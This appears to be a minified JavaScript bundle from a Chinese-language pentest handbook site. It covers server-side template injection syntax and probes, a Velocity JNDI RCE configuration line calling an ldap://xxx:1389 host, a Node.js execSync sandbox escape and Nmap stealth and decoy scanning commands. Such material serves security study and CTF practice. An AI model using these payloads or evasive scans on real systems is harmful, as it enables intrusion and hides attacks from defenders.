        \u53EF\u4EE5\u4ECE\u3010\u6CE8\u5165\u62A5\u9519\u4FE1\u606F\u3011\u4E2D\uFF0C\u8BFB\u51FA\u3010Template Engine\u3011\u6240\u91C7\u7528\u7684\u5E93\u662F\u54EA\u4E2A\u3002
            `))},e.b,{name:"\u3010Jade - Nodejs\u3011",content:t.a.createElement(t.a.Fragment,null,u.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`
              #{%s}
          `))},{name:"\u3010HandleBars\u3011 \u6A21\u677F\u5F15\u64CE\u3001\u6A21\u677F\u8BED\u8A00",desc:t.a.createElement(t.a.Fragment,null),content:t.a.createElement(t.a.Fragment,null,u.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(r.a.SSTI.HandleBars.\u4ECB\u7ECD,r.a.SSTI.HandleBars.\u76F8\u5173\u6280\u5DE7))},{name:"\u540E\u7EED\u5229\u7528\u65B9\u5F0F",desc:t.a.createElement(t.a.Fragment,null),content:t.a.createElement(t.a.Fragment,null,u.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

              \u7B2C\u4E00\uFF0C\u83B7\u5F97\u300AReverse Shell\u300B\uFF0C\u53CD\u5411\u4EE3\u7406shell

              \u7B2C\u4E8C\uFF0C\u76F4\u63A5\u62FF\u5230\u300Aflag\u300B

              `))}]},F={name:"\u3010Java \u2014\u2014\u2014\u2014SSTI\u3011",desc:t.a.createElement(t.a.Fragment,null),steps:[{name:"\u57FA\u672C\u4ECB\u7ECD",content:t.a.createElement(t.a.Fragment,null)},{name:"\u3010FreeMarker\u3011",content:t.a.createElement(t.a.Fragment,null,u.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`
              <#%s > \${%s}
          `))},{name:"\u3010Velocity\u3011",desc:t.a.createElement(t.a.Fragment,null),content:t.a.createElement(t.a.Fragment,null,u.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

              Velocity

              \u4ECB\u7ECD\uFF1A
                  Velocity \u662F\u4E00\u4E2A\u57FA\u4E8E Java \u7684\u6A21\u677F\u5F15\u64CE\u3002\u5B83\u5141\u8BB8\u4EFB\u4F55\u4EBA\u4F7F\u7528\u7B80\u5355\u800C\u5F3A\u5927\u7684\u6A21\u677F\u8BED\u8A00\u6765\u5F15\u7528 Java \u4EE3\u7801\u4E2D\u5B9A\u4E49\u7684\u5BF9\u8C61\u3002

              PoC
                  #set( $x=1+1 )\${x}

              \u914D\u7F6E\u6587\u4EF6RCE
                  \u914D\u7F6E\u6587\u4EF6\uFF0C\u8FD9\u91CC\u53EF\u4EE5\u914D\u7F6E\u6211\u4EEC\u7684jndi\u5730\u5740\uFF0C\u6211\u4EEC\u9700\u8981\u627E\u5230\u4E00\u4E2Asource\u70B9

                      \u6BD4\u5982\u300A  org.apache.velocity.runtime.RuntimeInstance#init  \u300B\u3002

                      \u5229\u7528\u65B9\u5F0F\uFF1A
                          \u914D\u7F6E\u9879\uFF0C\u4F8B\u5982\u300A  ds.resource.loader.datasource_url = ldap://xxx:1389/TomcatBypass/Command/Base64/Y2FsYy5leGU=  \u300B


             `))},{name:"\u3010ThymeLeaf\u3011",content:t.a.createElement(t.a.Fragment,null,u.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`
              \u65E0
          `))},{name:"\u3010Groovy*\u3011",content:t.a.createElement(t.a.Fragment,null,u.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`
              \u65E0
          `))},{name:"\u3010Jade -    \u5728Java\u3011",content:t.a.createElement(t.a.Fragment,null,u.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`
              \u65E0
          `))}]},p={name:"\u3010Python \u2014\u2014\u2014\u2014SSTI\u3011",desc:t.a.createElement(t.a.Fragment,null),steps:[{name:"\u57FA\u672C\u4ECB\u7ECD",content:t.a.createElement(t.a.Fragment,null)},{name:"\u3010jinja2\u3011",content:t.a.createElement(t.a.Fragment,null,u.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`
              {{%s}}
          `))},{name:"\u3010Mako\u3011",content:t.a.createElement(t.a.Fragment,null,u.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`
              \${%s}
          `))},{name:"\u3010Tornado\u3011",content:t.a.createElement(t.a.Fragment,null,u.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`
              {{%s}}
          `))},{name:"\u3010Django\u3011",content:t.a.createElement(t.a.Fragment,null,u.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`
              {{ }}
          `))},{name:"\u3010Python code eval\u3011",content:t.a.createElement(t.a.Fragment,null,u.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`
              na \u65E0
          `))},{name:"\u3010Python code exec\u3011",content:t.a.createElement(t.a.Fragment,null,u.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`
              na \u65E0
          `))}]},I={name:"\u3010PHP \u2014\u2014\u2014\u2014SSTI\u3011",desc:t.a.createElement(t.a.Fragment,null),steps:[{name:"\u57FA\u672C\u4ECB\u7ECD",content:t.a.createElement(t.a.Fragment,null)},{name:"\u3010Smarty\u3011",content:t.a.createElement(t.a.Fragment,null,u.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`
              {%s}
          `))},{name:"\u3010Smarty (secure mode) \u3011",content:t.a.createElement(t.a.Fragment,null,u.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`
              {%s}
          `))},{name:"\u3010Twig\u3011",content:t.a.createElement(t.a.Fragment,null,u.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`
              {{%s}}
          `))},{name:"\u3010PHP code eval\u3011",content:t.a.createElement(t.a.Fragment,null,u.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`
              na \u65E0
          `))}]},g={name:"\u3010\u524D\u7AEFJavaScript \u2014\u2014\u2014\u2014SSTI\u3011",desc:t.a.createElement(t.a.Fragment,null),steps:[{name:"\u57FA\u672C\u4ECB\u7ECD",content:t.a.createElement(t.a.Fragment,null)},{name:"\u3010NunJucks\u3011",content:t.a.createElement(t.a.Fragment,null,u.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`
              {{%s}}
          `))},{name:"\u3010doT\u3011",content:t.a.createElement(t.a.Fragment,null,u.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`
              {{=%s}}
          `))},{name:"\u3010Marko\u3011",content:t.a.createElement(t.a.Fragment,null,u.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`
              \u65E0
          `))},{name:"\u3010Dust\u3011",content:t.a.createElement(t.a.Fragment,null,u.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`
              {#%s}or{%s}or{@%s}
          `))},{name:"\u3010EJS\u3011",content:t.a.createElement(t.a.Fragment,null,u.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`
              <%= %>
          `))},{name:"\u3010\u524D\u7AEFJavaScript - code eval\u3011",content:t.a.createElement(t.a.Fragment,null,u.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`
              na \u65E0
          `))},{name:"\u3010VueJs\u3011",content:t.a.createElement(t.a.Fragment,null,u.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`
              {{%s}}
          `))}]},c={name:"\u3010Ruby \u2014\u2014\u2014\u2014SSTI\u3011",desc:t.a.createElement(t.a.Fragment,null),steps:[{name:"\u57FA\u672C\u4ECB\u7ECD",content:t.a.createElement(t.a.Fragment,null)},{name:"\u3010Slim\u3011",content:t.a.createElement(t.a.Fragment,null,u.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`
              #{%s}
          `))},{name:"\u3010ERB\u3011",content:t.a.createElement(t.a.Fragment,null,u.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`
              <%=%s%>
          `))},{name:"\u3010Ruby code eval\u3011",content:t.a.createElement(t.a.Fragment,null,u.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`
              na \u65E0
          `))}]},h={name:"\u3010Go \u2014\u2014\u2014\u2014SSTI\u3011",desc:t.a.createElement(t.a.Fragment,null),steps:[{name:"\u57FA\u672C\u4ECB\u7ECD",content:t.a.createElement(t.a.Fragment,null)},{name:"\u3010Go \u672A\u77E5SSTI\u624B\u6CD5\u3011",content:t.a.createElement(t.a.Fragment,null,u.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`
              Na \u65E0
          `))}]},w={name:"\u3010SSTI\u3011_\u3010\u524D\u540E\u7AEF\u7ED3\u5408 / \u6A21\u677F\u6CE8\u5165\u3011_\u624B\u518C",steps:[{name:"\u57FA\u672C\u4ECB\u7ECD\u3001\u3010Server Side Template Injection\u3011",desc:t.a.createElement(t.a.Fragment,null),content:t.a.createElement(t.a.Fragment,null,u.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`


\u8BE6\u7EC6\u8D44\u6599\uFF1A
    \u9AD8\u4EF7\u503C\uFF1A
        \u5F88\u5168\u7684\u6559\u7A0B\uFF1A    https://www.cnblogs.com/bmjoker/p/13508538.html


\u82F1\u6587\u5168\u79F0\uFF1A
    Server-side template injection

\u5E38\u89C1\u6A21\u677F\uFF1A
    1
        {{7*7}}
        \${7*7}
        <%= 7*7 %>
        \${{7*7}}
        #{7*7}
    2
        \${}
        {{}}
        <%= %>
        \${7/0}
        {{7/0}}
        <%= 7/0 %>
        \${foobar}
        {{foobar}}
        <%= foobar %>
        \${7*7}
        {{7*7}}

          `,t.a.createElement("div",null,t.a.createElement("h2",null,"\u5E38\u89C1\u7684 SSTI \u540E\u53F0\u6846\u67B6\uFF0C\u5E94\u7528\u5217\u8868\uFF1A"),t.a.createElement("img",{src:n("WZHl"),alt:""}),"\u3010\u7EFF\u7EBF\u3011\u4E3A\u4EA7\u751F\u6548\u679C\u4E86\uFF1B\u3010\u7EA2\u7EBF\u3011\u4E3A\u6CA1\u6709\u4EA7\u751F\u6548\u679C\u3002  \u7136\u540E\u3010\u4E8C\u5206\u6CD5\u3011\uFF0C\u5224\u65AD",t.a.createElement("img",{src:n("RyRH"),alt:""}))))},{name:"\u5E38\u89C1\u8FD0\u884C\u73AF\u5883\uFF1A\u3010\u524D\u7AEF\u6E32\u67D3\u5F15\u64CE \u7684 \u6C99\u76D2\u3011 \u3010SandBox\u3011",desc:t.a.createElement(t.a.Fragment,null,"\u51E1\u662F\u4F7F\u7528\u6A21\u677F\u7684\u5730\u65B9\u90FD\u53EF\u80FD\u4F1A\u51FA\u73B0 SSTI \u7684\u95EE\u9898\uFF0C SSTI \u4E0D\u5C5E\u4E8E\u4EFB\u4F55\u4E00\u79CD\u8BED\u8A00\uFF0C\u6C99\u76D2\u7ED5\u8FC7\u4E5F\u4E0D\u662F\uFF0C \u6C99\u76D2\u7ED5\u8FC7\u53EA\u662F\u7531\u4E8E\u6A21\u677F\u5F15\u64CE\u53D1\u73B0\u4E86\u5F88\u5927\u7684\u5B89\u5168\u6F0F\u6D1E\uFF0C\u7136\u540E\u6A21\u677F\u5F15\u64CE\u8BBE\u8BA1\u51FA\u6765\u7684\u4E00\u79CD\u9632\u62A4\u673A\u5236\uFF0C \u4E0D\u5141\u8BB8\u4F7F\u7528\u6CA1\u6709\u5B9A\u4E49\u6216\u8005\u58F0\u660E\u7684\u6A21\u5757\uFF0C\u8FD9\u9002\u7528\u4E8E\u6240\u6709\u7684\u6A21\u677F\u5F15\u64CE\u3002"),steps:[{name:"\u5E38\u89C1\u8FD0\u884C\u73AF\u5883\uFF1ANodeJS\u7684\u3010\u6C99\u76D2\u3011 \uFF08\u3010sandbox\u3011\uFF09",desc:t.a.createElement(t.a.Fragment,null),content:t.a.createElement(t.a.Fragment,null,u.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

              \u3010\u540E\u7AEF\u7684\u670D\u52A1\u5668\u4EE3\u7801\u3011\uFF0C\u4F1A\u7ECF\u5E38\u5728\u3010 \u6C99\u76D2SandBox \u3011\u73AF\u5883\u4E2D\uFF0C\u6765\u8FD0\u884C\uFF1A
                  \u6240\u4EE5\uFF1A\u2014\u2014\u2014\u2014\u2014\u2014\u4EE3\u7801\u53D7\u9650\u3002

              Node.js\u7684\u3010\u5168\u5C40\u53D8\u91CFGlobal\u3011
                  \u8D44\u6599\uFF1A
                      https://nodejs.org/api/globals.html
                      https://stackoverflow.com/questions/43627622/what-is-the-global-object-in-nodejs#:~:text=While%20in%20browsers%20the%20global,be%20local%20to%20this%20module.&text=The%20global%20namespace%20object,scope%20is%20the%20global%20scope.

                  \u601D\u8DEF\uFF1A
                      \u6211\u4EEC\u901A\u8FC7\uFF0C\u4E00\u4E9B\u3010\u5E38\u89C1\u8BEF\u89E3\u3011\u6765\u7ED5\u8FC7

                  \u90E8\u5206\u3010\u770B\u4E0A\u53BB\u662F\u5168\u5C40\u3011\uFF0C\u800C\u5B9E\u9645\u4E0A\u53EA\u662F\u3010\u6A21\u5757\u5185\u4F5C\u7528\u57DF\u3011\uFF0C\u7684\u53D8\u91CF\u5217\u8868\uFF1A
                      \uFF08https://nodejs.org/api/globals.html#apicontent\uFF09
                      __dirname
                      __filename
                      exports
                      module
                      require()

                  \u5176\u5B83\u53EF\u7528\u7684\u3010\u771F\u6B63\u5168\u5C40\u3011\uFF0C\u7684\u53D8\u91CF\u5217\u8868\uFF1A
                      global
                      module
                      process
                      setTimeout

                  \u7279\u522B\u6709\u7528\u7684\uFF0C\u4E00\u4E9B\u53D8\u91CF\uFF1A

                      \u3010process.mainModule\u3011

                          \u51FA\u73B0\u5730\u70B9\uFF1A
                              https://nodejs.org/api/process.html#processmainmodule

                          \u4F7F\u7528\u65B9\u5F0F\uFF1A
                              \u8D44\u6599\uFF1Ahttps://www.geeksforgeeks.org/node-js-process-mainmodule-property/

                              process.mainModule.require("xxx").execSync("yyy")

                  \u7ED3\u679C\u67E5\u770B\uFF1A(\u6700\u540E\u4E00\u884C\uFF0C\u624D\u662F\u7ED3\u679C\u8F93\u51FA)

                      e
                      2
                      [object Object]
                      function Function() { [native code] }
                      2
                      [object Object]
                      [object Object]

              `))}]},E,g,F,p,I,c,h]},a=w},"jR+D":function(H,d,n){H.exports=n.p+"static/planet_fantasy_3.d532a2d0.png"},kfBs:function(H,d,n){H.exports={"ant-pro-menu-item-title":"ant-pro-menu-item-title___mwQLa","ant-menu-item":"ant-menu-item___o39QO","ant-menu-submenu-title":"ant-menu-submenu-title___2xzrJ",cascader:"cascader___YCSAg",cascaderDropdown_wra:"cascaderDropdown_wra___3BFU3",xssTree:"xssTree___3Nyqx"}},nMEn:function(H,d,n){"use strict";n.r(d),n.d(d,"Nmap_\u624B\u518C",function(){return E});var S=n("q1tI"),t=n.n(S),l=n("ysNt"),r=n("s1IG"),e=n("jJ7j"),u=l.l.singleATag_blank,m={name:"\u3010Nmap\u3011_\u624B\u518C",desc:t.a.createElement(t.a.Fragment,null,"Nmap\u626B\u63CF\u5DE5\u5177\uFF0C\u6700\u91CD\u8981\u7684\u626B\u63CF\u5DE5\u5177\u4E4B\u4E00"),steps:[{name:"\u601D\u8DEF",content:t.a.createElement(t.a.Fragment,null,e.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E("	\uFF08\u679A\u4E3E\u4E3B\u673A\uFF0C\u6307\u6309\u7167\u3010\u5DF2\u6709\u89C4\u5219\u3011\uFF0C\u53BB\u3010\u7A77\u5C3D\u679A\u4E3E\u3011\u7684\u5339\u914D\u3002\uFF09"," "))},{name:"\u5E38\u89C4\u626B\u63CF",steps:[{name:"TCP",desc:t.a.createElement(t.a.Fragment,null),content:t.a.createElement(t.a.Fragment,null,t.a.createElement(r.b,{special_name:"Nmap_IP",var_names_arr:["ip","port_arr_csv"],code_template_arr:["nmap  --max-rate  10000       ###<ip>###","nmap  -p-  --max-rate  10000  ###<ip>###","nmap  -A  -sV  -sC  -Pn  -p   ###<port_arr_csv>###      ###<ip>###","ports=$(nmap -p- --min-rate=1000 -T4    ###<ip>### | grep ^[0-9] | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$//)    &&    nmap  -A  -sV  -sC  -Pn  -p$ports  ###<ip>###  --open",`masscan -p1-65535 ###<ip>### --rate=1000 -e tun0 > ports    &&    ports=$(cat ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | tr '\\n' ',' | sed 's/,$//')    &&    nmap -A -sV -sC -Pn -p$ports ###<ip>###    `]}),e.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`


          \u521D\u671F\u7B80\u5355(\u6253\u70B9)\u63A2\u6D4B\uFF1A

              \u624B\u52A8\u3001\u9010\u6B65\u65B9\u5F0F\uFF1A

                  \u6D77\u6295\uFF0C\u521D\u7B5B

                      \u7B2C\u4E00\u6B21\uFF0C\u6781\u901F\u626B\uFF1A
                          nmap  --max-rate  10000  <IP\u5730\u5740>

                      \u7B2C\u4E8C\u6B21\uFF0C\u6302\u540E\u53F0\u626B\uFF1A
                          nmap  -p-  --max-rate  10000  <IP\u5730\u5740>
                              \u597D\u5904\u662F\uFF0C\u901F\u5EA6\u975E\u5E38\u5FEB\uFF0C\u53EF\u4EE5\u907F\u514D\u3010\u91CD\u8981\u7AEF\u53E3\u4E22\u5931\u3011

                          \u3010\u6587\u4EF6\u8BFB\u53D6\u3011\u589E\u5F3A\u7248\uFF1A
                              nmap  -p-  --max-rate  10000   -vv  -iL  <\u5B58\u653E\u4E00\u7EC4IP\u7684\u6587\u4EF6>  -oA  <\u8F93\u51FA\u62A5\u544A\u540D>
                                  \u8FD9\u79CD\u65B9\u5F0F\uFF0C\u53EF\u4EE5\u3010\u521D\u7B5B\u3011\u4E00\u6279\u3002
                  \u5355\u626B\uFF0C\u7CBE\u7EC6\u626B\u63CF
                      nmap  -A  -sV  -sC  -Pn  -p  <\u7AEF\u53E3\u53F7\u591A\u4E2A\u7528\u9017\u53F7\u5206\u9694>  <IP\u5730\u5740>
                          \u7AEF\u53E3\u7684\u51E0\u79CD\u5F62\u5F0F\uFF1A
                              -p 111,222,333
                              -p-
                              -p1-65535
                              -p T:1-65535

              \u81EA\u52A8\u3001\u4E00\u884C\u4EE3\u7801\u65B9\u5F0F
                  \u4E00\uFF1A
                      ports=$(nmap -p- --min-rate=1000 -T4 <IP\u5730\u5740> | grep ^[0-9] | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$//)
                          \u901A\u8FC7\u521D\u6B65\u626B\u63CF\uFF0C\u5F97\u5230\u3010\u5168\u90E8\u7AEF\u53E3\u3011
                      nmap  -A  -sV  -sC  -Pn  -p$ports  <IP\u5730\u5740>  --open
                          \u3010--open\u3011\uFF0C\u53EA\u663E\u793A \u3010\u5F00\u653E\u7AEF\u53E3\u3011 \u90E8\u5206

                      \u5408\u6210\u4E00\u4E2A\uFF1A
                          ports=$(nmap -p- --min-rate=1000 -T4 <IP\u5730\u5740> | grep ^[0-9] | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$//)    &&    nmap  -A  -sV  -sC  -Pn  -p$ports  <IP\u5730\u5740>  --open

                  \u4E8C\uFF1A
                      masscan -p1-65535 <IP\u5730\u5740> --rate=1000 -e tun0 > ports

                      ports=$(cat ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | tr '\\n' ',' | sed 's/,$//')

                      nmap -A -sV -sC -Pn -p$ports <IP\u5730\u5740>

                      \u5408\u6210\u4E00\u4E2A\uFF1A
                          masscan -p1-65535 <IP\u5730\u5740> --rate=1000 -e tun0 > ports    &&    ports=$(cat ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | tr '\\n' ',' | sed 's/,$//')    &&    nmap -A -sV -sC -Pn -p$ports <IP\u5730\u5740>



          nmap  -A  -sV  -sC  -Pn  <IP\u5730\u5740>
              1. \u4E00\u822C\u6765\u8BF4\uFF0C\u6700\u5E38\u7528\u7684\u4E00\u79CD\u65B9\u6848

          nmap  -A  -sV  -sC  -Pn  -vv  <IP\u5730\u5740>
              1. \u5E26\u7740\u66F4\u591A\u7684\u65E5\u5FD7


          nmap  -A  IP\u5730\u5740
              1.\u975E\u79D8\u5BC6\u68C0\u6D4B
              2.\u9ED8\u8BA4\u4F7F\u7528\u3010TCP\u3011\u68C0\u6D4B
              3.\u3010-A\u3011 \u542F\u7528 OS Detect\u3001Version Detect\u3001Script Scanning\u3001TraceRoute

          nmap -sV -sC -p- -Pn <IP\u5730\u5740> --min-rate=<\u63A2\u6D4B\u9891\u7387>
              1.\u4E5F\u662F\u4E00\u79CD\u8F83\u5E38\u7528\u7684\u65B9\u6848

          `,`
          \u626B\u63CFC\u6BB5\uFF1A
              nmap -A xxx.xxx.xxx.xxx/24
            `))},{name:"UDP",desc:t.a.createElement(t.a.Fragment,null,"\u7279\u70B9\uFF1A\u6781\u6162"),content:t.a.createElement(t.a.Fragment,null,e.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

          \u3010UDP\u3011
              \u9700\u8981\u3010sudo\u3011\u6743\u9650

              nmap  -sU  <IP\u5730\u5740>
                  1.\u4F7F\u7528\u3010UDP\u3011\u68C0\u6D4B\u3002
                      1.\u6709\u65F6\uFF0C\u548C\u3010TCP\u3011\u622A\u7136\u4E0D\u540C\u3002

              nmap  -sC  -sU  <IP\u5730\u5740>
                  1.\u4F7F\u7528\u3010UDP\u3011\u68C0\u6D4B\u3002
                      1.\u6709\u65F6\uFF0C\u548C\u3010TCP\u3011\u622A\u7136\u4E0D\u540C\u3002

              `))}]},{name:"\u3010\u79D8\u5BC6\u626B\u63CF\u3011",content:t.a.createElement(t.a.Fragment,null,e.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E("	nmap -sS -A IP\u5730\u5740","		\u79D8\u5BC6\u68C0\u6D4B","		\u3010-sS\u3011 \u4F7F\u7528\u3010TCP/SYN\u3011\uFF0C\u75D5\u8FF9\u66F4\u52A0\u4E0D\u660E\u663E","	\u6700\u5C0F\u5316\u88AB\u68C0\u6D4B\u5230\u7684\u79D8\u5BC6\u626B\u63CF\uFF1A","		nmap --spoof-mac Cisco --data-length 24 -T paranoid --max-hostgroup 1 --max-parallelism 10 -Pn -f -D <\u8BF1\u9975\u626B\u63CFIP\u5730\u5740>,<RND:5>,ME -v -n -sS -sV -oA <\u7ED3\u679C\u8F93\u51FA\u5730\u5740> -p T:<\u5F00\u59CB\u7AEF\u53E3-\u7ED3\u675F\u7AEF\u53E3> --randomize-hosts <\u82E5\u5E72\u4E2A\u626B\u63CFIP\u5730\u5740>","			--spoof-mac Cisco \u4F2A\u9020MAC\u5730\u5740\uFF0C\u4EE5\u5339\u914D\u601D\u79D1\u7684\u4EA7\u54C1  \uFF080\u5219\u662F\u968F\u673A\uFF09","			--data-length 24 \u5411\u5927\u591A\u6570\u6B63\u5728\u53D1\u9001\u7684\u5305\uFF0C\u9644\u52A024\u5B57\u8282\u3010\u968F\u673A\u6570\u636E\u3011  \uFF08\u4EE5\u9632\u6B62\u90FD\u662F\u540C\u6837\u6570\u636E\uFF0C\u88AB\u8BC6\u522B\uFF09","			-T paranoid \u5C06\u65F6\u95F4\u8BBE\u7F6E\u5230 \u6700\u6162","			--max-hostgroup 1 \u9650\u5236\u4E00\u6B21\u626B\u63CF\u7684\u6700\u5927\u4E3B\u673A\u6570","			--max-parallelism 10 \u9650\u5236\u53D1\u9001\u3010\u6709\u6548\u63A2\u9488\u3011\u7684\u6570\u91CF  \uFF08\u4E0E--scan-delay\u4E0D\u517C\u5BB9\uFF09","			-Pn \u4E0D\u7528ping\u6765\u786E\u5B9A\u6D3B\u52A8\u7CFB\u7EDF  \uFF08ping\u53EF\u80FD\u4F1A\u6CC4\u9732\u6570\u636E\uFF09","			-f \u5206\u9694\u6570\u636E\u5305  \uFF08\u7528\u6765\u6B3A\u9A97 \u4F4E\u7AEF\u548C\u914D\u7F6E\u4E0D\u6B63\u786E \u7684ID\uFF09",t.a.createElement("div",{style:{marginLeft:"6.5em"}},"-D 10.1.20.5,RND,ME \u521B\u5EFA\u3010\u8BF1\u9975\u626B\u63CF\u3011\uFF0C\u4E0E\u653B\u51FB\u8005\u7684\u3010\u771F\u6B63\u626B\u63CF\u3011\u540C\u65F6\u8FD0\u884C\uFF0C\u53EF\u4EE5\u9690\u85CF\u5B9E\u9645\u653B\u51FB",t.a.createElement("ol",{style:{}},t.a.createElement("li",null,"\u539F\u7406\uFF1A\u6211\u770B\u522B\u4EBA\u6709\u65F6\u5728\u7528\uFF0C\u4F46\u539F\u7406\u770B\u4F3C\u5F88\u7384\u4E4E\uFF1B\u7ECF\u8FC7\u4E2A\u4EBA\u5206\u6790\u540E\uFF0C\u8BA4\u4E3A\u662F\u3010\u4F4E\u7EA7\u9A97\u672F\u3011\u3001\u4F46\u5BF9\u3010\u4F4E\u7EA7\u534F\u8BAE\u3011\u6709\u6548\u3002\uFF08\u670D\u52A1\u5668\u7ADF\u7136\u4F1A\u76F8\u4FE1\u4F60\uFF09"),t.a.createElement("li",null,"\u4F2A\u9020\u7684IP\uFF1A\uFF08\u4E24\u79CD\u65B9\u5F0F\uFF0C\u53EF\u4EE5\u6DF7\u5408\u4F7F\u7528\uFF09",t.a.createElement("ol",null,t.a.createElement("li",null,"\u65B9\u5F0F\u4E00\uFF1A\u624B\u52A8\u6307\u5B9A\u3010\u7279\u5B9AIP\u3011\uFF0C\u4EC0\u4E48\u90FD\u53EF\u4EE5",t.a.createElement("ol",null,t.a.createElement("li",null,"\u6BD4\u5982\uFF0C\u6211\u4EEC\u501F\u7528\u3010fofa\u3011\u5BF9\u3010securitytrails.com\u3011\u7684\u641C\u7D22\u7ED3\u679C\uFF1A\u3010-D 18.204.63.62,172.245.134.240,151.101.194.132,151.101.2.132\u3011"))),t.a.createElement("li",null,"\u65B9\u5F0F\u4E8C\uFF1A\u968F\u673A\u751F\u6210\uFF1A\u3010-D RND ","<\u4F2A\u9020\u6E90\u5730\u5740\u6570\u91CF>","\u3011"))))),"			-n \u4E0D\u4F7F\u7528DNS\u89E3\u6790 \uFF08\u56E0\u4E3A\u5185\u90E8\u6216\u5916\u90E8DNS\u670D\u52A1\u5668\uFF0C\u7ECF\u5E38\u4F1A\u8BB0\u5F55nmap\u63D0\u4EA4\u7684DNS\u4FE1\u606F\u67E5\u8BE2\uFF1B\u6240\u4EE5\uFF0C\u6211\u4EEC\u5E94\u8BE5\u7981\u7528DNS\u4FE1\u606F\u67E5\u8BE2\uFF09","			-sS \u8FDB\u884C\u79D8\u5BC6\u7684\u3010TCP SYN\u3011\u626B\u63CF  \uFF08\u8FD9\u5C06\u4E0D\u9700\u8981\u5B8C\u6574\u7684\u3010TCP\u63E1\u624B\u3011\uFF0C\u5C3D\u91CF\u907F\u514D\u89E6\u53D1\u3010\u8BBE\u5907\u68C0\u6D4B\u3011\uFF09","			-sV \u901A\u8FC7\u5F00\u542F\u7684\u7AEF\u53E3\uFF0C\u6765\u63A8\u6D4B\u670D\u52A1\u6216\u7248\u672C","			\u3010-oA\u3011 /desktop/pentest/nmap \u5C06\u7ED3\u679C\u8F93\u51FA  \uFF08\u53EF\u4EE5\u6307\u5B9A\u5404\u79CD\u683C\u5F0F\uFF09","			-p T:1-1024 \u6307\u5B9A\u8981\u626B\u63CF\u7684TCP\u7AEF\u53E3  \uFF08\u4E5F\u53EF\u4EE5\u662F\u8303\u56F4\uFF09","			--randomize-hosts \u968F\u673A\u5316\u76EE\u6807\u4E3B\u673A\u7684\u626B\u63CF\u6B21\u5E8F"," "))},{name:"\u811A\u672C\u4F7F\u7528",content:t.a.createElement(t.a.Fragment,null,e.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(t.a.createElement(t.a.Fragment,null,"	","\u5E38\u89C1\u6307\u4EE4\uFF1A \uFF08",u("\u8D44\u65991","https://zhuanlan.zhihu.com/p/26618074"),"\uFF09"),"		1.\u3010--script-updatedb\u3011\uFF0C\u5347\u7EA7\u6240\u6709\u811A\u672C"," ","		2.\u3010--script=\u811A\u672C\u540D\u79F0\u3011\uFF0C\u4F7F\u7528\u67D0\u4E2A\u811A\u672C","		3.\u3010--script-help=\u811A\u672C\u540D\u79F0\u3011\uFF0C\u67E5\u770B\u67D0\u4E2A\u811A\u672C\u7684\u5E2E\u52A9\u4FE1\u606F"," ","		3.\u3010--script-args=key1=value1,key2=value2...\u3011\uFF0C\u4F20\u9012\u591A\u4E2A\u53C2\u6570","		4.\u3010\u2013-script-args-file=\u6587\u4EF6\u540D\u3011\uFF0C\u4F7F\u7528\u6587\u4EF6 \u6765\u4F20\u9012\u53C2\u6570"," ","		5.\u3010--script-trace\u3011\uFF0C\u6253\u5370\u6536\u53D1\u8BF7\u6C42\u7684\u901A\u4FE1\u4FE1\u606F\u3002","	\u9488\u5BF9\u76EE\u6807\u4E3B\u673A \u6267\u884C\u6240\u6709\u7684\u811A\u672C\uFF1A","		nmap -T4 -A -sV 